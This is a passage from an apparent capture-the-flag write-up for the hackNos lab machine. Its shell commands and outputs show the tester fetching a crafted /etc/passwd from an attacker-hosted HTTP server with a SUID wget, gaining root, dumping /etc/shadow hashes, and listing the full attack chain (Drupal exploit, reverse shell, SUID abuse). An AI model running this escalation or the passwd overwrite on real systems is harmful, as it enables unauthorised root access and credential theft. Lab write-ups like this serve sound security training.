VERSION="16.04.6 LTS (Xenial Xerus)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 16.04.6 LTS"
VERSION_ID="16.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
VERSION_CODENAME=xenial
UBUNTU_CODENAME=xenial
```

### /etc files

```shell
www-data@hackNos:/var/www/html$ ls -la /etc/{passwd,passwd-,shadow,shadow-,group}
<tml$ ls -la /etc/{passwd,passwd-,shadow,shadow-,group}
-rw-r--r-- 1 root root    811 Oct 31  2019 /etc/group
-rw-r--r-- 1 root root   1620 Oct 31  2019 /etc/passwd
-rw------- 1 root root   1605 Oct 31  2019 /etc/passwd-
-rw-r----- 1 root shadow 1067 Nov 16  2019 /etc/shadow
-rw------- 1 root root    970 Oct 31  2019 /etc/shadow-
```

## Abusing wget being in SUID binary list

```shell
www-data@hackNos:/etc$ echo 'salty:$6$salty$TwLZ.kG/oqyEnXrhYGO8tQPAaX8GVJE5mhKgLSy9yKz7cNjaVNx3.7FtBVn4VEe.daS/nqBRwyEPpOr.jf228.:0:0:root:/:/bin/bash' >> /etc/passwd
<Ee.daS/nqBRwyEPpOr.jf228.:0:0:root:/:/bin/bash' >> /etc/passwd
bash: /etc/passwd: Permission denied

# since wget can run as root, this will work
www-data@hackNos:/etc$ wget -q 192.168.56.70/etc-passwd.txt -O passwd
wget -q 192.168.56.70/etc-passwd.txt -O passwd

```

```shell
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.56.87 - - [03/Jan/2022 11:36:41] "GET /etc-passwd.txt HTTP/1.1" 200 -
```


```shell
www-data@hackNos:/etc$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
james:x:1000:1000:james,,,:/home/james:/bin/bash
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
mysql:x:111:118:MySQL Server,,,:/nonexistent:/bin/false
salty:$6$salty$TwLZ.kG/oqyEnXrhYGO8tQPAaX8GVJE5mhKgLSy9yKz7cNjaVNx3.7FtBVn4VEe.daS/nqBRwyEPpOr.jf228.:0:0:root:/:/bin/bash
```

## Become root

```shell
www-data@hackNos:/etc$ su salty
su salty
Password: password

root@hackNos:/etc# whoami
whoami
root
root@hackNos:/etc# id
id
uid=0(root) gid=0(root) groups=0(root)
root@hackNos:/etc# hostname
hostname
hackNos
root@hackNos:/etc# date
date
Mon Jan  3 11:40:26 IST 2022
root@hackNos:/etc# cd /root
cd /root
root@hackNos:/root# ls -la
ls -la
total 36
drwx------  3 root root 4096 Nov 16  2019 .
drwxr-xr-x 22 root root 4096 Oct 31  2019 ..
-rw-------  1 root root  407 Nov 16  2019 .bash_history
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
drwxr-xr-x  2 root root 4096 Oct 31  2019 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root  491 Nov 16  2019 root.txt
-rw-------  1 root root 4141 Nov 16  2019 .viminfo
root@hackNos:/root# cat root.txt
cat root.txt
    _  _                              _
  _| || |_                           | |
 |_  __  _|______  _ __  ___    ___  | |_
  _| || |_|______|| '__|/ _ \  / _ \ | __|
 |_  __  _|       | |  | (_) || (_) || |_
   |_||_|         |_|   \___/  \___/  \__|



MD5-HASH : bae11ce4f67af91fa58576c1da2aad4b

Author : Rahul Gehlaut

Linkedin : https://www.linkedin.com/in/rahulgehlaut/

Blog : www.hackNos.com
root@hackNos:/root# cat /etc/shadow
cat /etc/shadow
root:$6$ii3GEj5H$DHrrLj9Q9Bpux.aVR9fy1e240PyBPSI/yh5WGRUyN7TN7Ulb5rFO0CoAVRY8UYvdxhgw142tkmgyqubP4l1ta0:18216:0:99999:7:::
daemon:*:17953:0:99999:7:::
bin:*:17953:0:99999:7:::
sys:*:17953:0:99999:7:::
sync:*:17953:0:99999:7:::
games:*:17953:0:99999:7:::
man:*:17953:0:99999:7:::
lp:*:17953:0:99999:7:::
mail:*:17953:0:99999:7:::
news:*:17953:0:99999:7:::
uucp:*:17953:0:99999:7:::
proxy:*:17953:0:99999:7:::
www-data:*:17953:0:99999:7:::
backup:*:17953:0:99999:7:::
list:*:17953:0:99999:7:::
irc:*:17953:0:99999:7:::
gnats:*:17953:0:99999:7:::
nobody:*:17953:0:99999:7:::
systemd-timesync:*:17953:0:99999:7:::
systemd-network:*:17953:0:99999:7:::
systemd-resolve:*:17953:0:99999:7:::
systemd-bus-proxy:*:17953:0:99999:7:::
syslog:*:17953:0:99999:7:::
_apt:*:17953:0:99999:7:::
lxd:*:18200:0:99999:7:::
messagebus:*:18200:0:99999:7:::
uuidd:*:18200:0:99999:7:::
dnsmasq:*:18200:0:99999:7:::
james:$6$ImB2eoJe$bnE3xrR1mBD1WtBjccl2Nh74wqDqJtMklx1lTEJyouewzdWRICla32oHXz9YNq0hImAoCSkM2tRyvQhxEuO9e.:18216:0:99999:7:::
sshd:*:18200:0:99999:7:::
mysql:!:18200:0:99999:7:::
```

![20.rooted](20.rooted.png)

## How to root

1. fuzz web, decode and execute to get useless credentials. Don't do this.
2. Find /drupal/robots.txt
3. Find admin login url
4. Find exploit against drupal version
5. Get reverse shell
6. Find SUID binary
7. Mangle /etc/passwd
8. Be root

## What I could have done diffrently

### fuzz

```shell
gobuster dir --url http://$RHOST -x js,png,py,txt,php,log,bak --wordlist=/usr/share/wordlists/wfuzz/general/big.txt -b 404,403 -q
/alexander.txt        (Status: 200) [Size: 393]

```

But this was useless.

### attack via wget earlier.

Once I realized wget was in SUID list, (it took time to click), I rememberd an attack on passwd file.

After realizing wget, it took me 2 minutes to root.

Rooted.

</body>
</html>
